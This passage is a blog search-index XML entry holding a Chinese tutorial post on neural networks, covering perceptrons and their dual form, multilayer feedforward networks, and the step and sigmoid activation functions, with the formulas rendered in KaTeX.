<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>神经网络</title>
      <link href="/2020/08/21/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
      <url>/2020/08/21/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>神经网络算法</p></blockquote><a id="more"></a><h1 id="感知机perceptron"><a class="markdownIt-Anchor" href="#感知机perceptron"></a> 感知机（Perceptron）</h1><h2 id="神经元neuron模型"><a class="markdownIt-Anchor" href="#神经元neuron模型"></a> 神经元（neuron）模型</h2><ul><li>联结主义：神经网络是由具有适应性的简单单元组成的广泛并行互连的网络，它的组织能够模拟生物神经系统对真实世界物体所作出的交互反应。</li><li>神经网络中最基本的成分是神经元（neuron）模型，即“简单单元”，在生物神经网络中，每个神经元与其他神经元相连，当它“兴奋”时，就会向相连的神经元发送化学物质，从而改变这些神经元内的电位；如果某神经元的电位超过一个“阈值（threshold）”，那么它就会被激活，即“兴奋” 起来，向其他神经元发送化学物质。</li></ul><p><img src="/images/pasted-92.png" alt="神经元" /></p><h2 id="感知机模型"><a class="markdownIt-Anchor" href="#感知机模型"></a> 感知机模型</h2><ul><li>感知机由单个神经元组成的单层神经网络，树突接收其他轴突传递来的信息，在通过自己的轴突传递出去。感知机三个功能：加权、求和、激励</li></ul><p><img src="/images/pasted-94.png" alt="感知机" /></p><ul><li>权重及阈值θ通过学习获得，阈值θ可看做一个固定输入为-1的哑结点（dummy node）所对应的权重 。这样权重和阈值可以统一学习。对训练样例(x,y)，感知机输出 ，学习规则：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub><mo>←</mo><msub><mi>w</mi><mi>i</mi></msub><mo>+</mo><mi mathvariant="normal">∇</mi><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_i←w_i+\nabla{w_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">←</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord">∇</span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∇</mi><msub><mi>w</mi><mi>i</mi></msub><mo>=</mo><mi>η</mi><mo stretchy="false">(</mo><mi>y</mi><mo>−</mo><mover accent="true"><mi>y</mi><mo stretchy="true">^</mo></mover><mo stretchy="false">)</mo><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\nabla{w_i}=η(y-\widehat{y})x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord">∇</span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.67056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span class="svg-align" style="width:calc(100% - 0.11112em);margin-left:0.11112em;top:-3.43056em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.24em;"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22c-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>η∈(0,1)称为学习率(learning rate)。</li></ul><h2 id="对偶形式"><a class="markdownIt-Anchor" href="#对偶形式"></a> 对偶形式</h2><ul><li>每一轮迭代中我们都要判断某个输入实例是不是误判点，即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>w</mi><msub><mi>x</mi><mi>i</mi></msub><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo><mo>&lt;</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">y_i(wx_i+b)&lt;=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>则为误判，需要更新权重。时间复杂度O(n)，n为特征数量。</li><li>使用对偶形式，判断条件改为：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">(</mo><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>N</mi></msubsup><msub><mi>a</mi><mi>j</mi></msub><msub><mi>y</mi><mi>j</mi></msub><msub><mi>x</mi><mi>j</mi></msub><msub><mi>x</mi><mi>i</mi></msub><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y_i(\sum_{j=1}^{N}a_jy_jx_jx_i+b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.417049em;vertical-align:-0.43581800000000004em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.981231em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span>，预先计算输入实例两两内积，得到Gram矩阵<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy="false">[</mo><msub><mi>x</mi><mi>i</mi></msub><msub><mi>x</mi><mi>j</mi></msub><mo stretchy="false">]</mo><mi>N</mi><mo>∗</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">G=[x_ix_j]N*N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span></span></span></span>，时间复杂度为O(N)，N为训练数据数量。</li><li>对偶形式的目的是降低运算量，但是并不是在任何情况下都能降低运算量，而是在特征空间的维度很高时才起到作用。</li></ul><h2 id="感知机的问题"><a class="markdownIt-Anchor" href="#感知机的问题"></a> 感知机的问题</h2><ul><li>感知机只有输出层神经元进行激活函数处理，即只拥有一层功能神经元。与或非问题都是线性可分（linearly separable）。感知机对线性可分学习过程一定收敛，非线性可分问题w难以稳定下来，不能求合适的解，如下图。</li></ul><p><img src="/images/pasted-95.png" alt="感知机无法解决非线性问题" /></p><ul><li>要解决非线性可分问题，需要考虑使用多层功能神经元</li></ul><p><img src="/images/pasted-96.png" alt="能解决非线性问题的两层感知机" /></p><h1 id="多层感知机"><a class="markdownIt-Anchor" href="#多层感知机"></a> 多层感知机</h1><h2 id="多层感知机模型"><a class="markdownIt-Anchor" href="#多层感知机模型"></a> 多层感知机模型</h2><p><img src="/images/pasted-97.png" alt="多层感知机" /></p><h3 id="网络结构"><a class="markdownIt-Anchor" href="#网络结构"></a> 网络结构</h3><ul><li><p>输入层：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>i</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi>d</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x_i(i=0,...d)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathdefault">d</span><span class="mclose">)</span></span></span></span></p></li><li><p>隐藏层：隐藏单元<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>z</mi><mi>h</mi></msub><mo stretchy="false">(</mo><mi>h</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi>H</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">z_h(h=1,...H)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mclose">)</span></span></span></span>，只有一个隐藏层时，网络是两层网络。</p></li><li><p>输出层：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>i</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi>K</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y_i(i=0,...K)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mclose">)</span></span></span></span></p></li><li><p>多层感知机层与层之间是全连接的</p></li><li><p>放射变换：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Y</mi><mo>=</mo><mi>X</mi><mo>⋅</mo><mi>W</mi><mo>+</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">Y=X \cdot W +B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span></p></li><li><p>网络结构中，输入层与输出层之间的神经元层成为隐含层（hidden layer），每层神经元与下一层神经元完全互联，神经元之间不存在同层连接，也不存在跨层连接，称为多层前馈网络结构(multi-layer feedforward nerual networks)</p><ul><li>多层网络：包含隐层的网络</li><li>前馈网络：神经元之间不存在同层连接也不存在跨层连接</li></ul></li><li><p>隐层和输出层具有激活函数，所以这两层的神经元亦称“功能单元”。多层前馈网络有强大的表示能力。只需一个包含足够多神经元的隐层，多层前馈神经网络就能以任意精度逼近任意复杂度的连续函数。设置隐层神经元数，通常用“试错法”。</p><ul><li>主要特点：信号是前向传播的，而误差是反向传播的。</li><li>主要过程：信号的前向传播，从输入层经过隐含层，最后到达输出层</li><li>误差的反向传播，从输出层到隐含层，最后到输入层，依次调节隐含层到输出层的权重和偏置，输入层到隐含层的权重和偏置</li></ul></li></ul><h2 id="激活函数"><a class="markdownIt-Anchor" href="#激活函数"></a> 激活函数</h2><ul><li>隐层一般使用sigmoid、tanh、relu</li><li>输出层根据任务不同，二分类问题使用sigmoid、tanh、relu，多分类使用softmax</li></ul><h3 id="阶跃函数"><a class="markdownIt-Anchor" href="#阶跃函数"></a> 阶跃函数</h3><ul><li>理想激活函数是阶跃函数，0 表示抑制神经元，而1表示激活神经元</li><li>阶跃函数具有不连续、不光滑等不好的性质，常用的是Sigmoid函数</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>e</mi><msub><mi>p</mi><mi>f</mi></msub><mi>u</mi><mi>n</mi><mi>c</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mi>i</mi><mi>f</mi><mi>x</mi><mo>&gt;</mo><mn>0</mn><mi>e</mi><mi>l</mi><mi>s</mi><mi>e</mi><mn>0</mn></mrow><annotation encoding="application/x-tex">step_func(x)=1 if x&gt;0 else 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault">u</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord">0</span></span></span></span></span></p><h3 id="sigmoid函数"><a class="markdownIt-Anchor" href="#sigmoid函数"></a> Sigmoid函数</h3><ul><li>Sigmoid函数可能在较大范围内变化的输入值挤压到（0,1）输出值范围内，因此有时也称为”挤压函数”</li><li>把这样许多个神经元按一定的层次结构连接起来，就得到了神经网络。</li></ul><p><img src="/images/pasted-93.png" alt="Sigmoid函数" /></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>i</mi><mi>g</mi><mi>m</mi><mi>o</mi><mi>i</mi><mi>d</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><msup><mi>e</mi><mrow><mo>−</mo><mi>x</mi></mrow></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">sigmoid(x)=\frac{1}{1+e^{-x}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.09077em;vertical-align:-0.7693300000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.697331em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693300000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h3 id="relu函数"><a 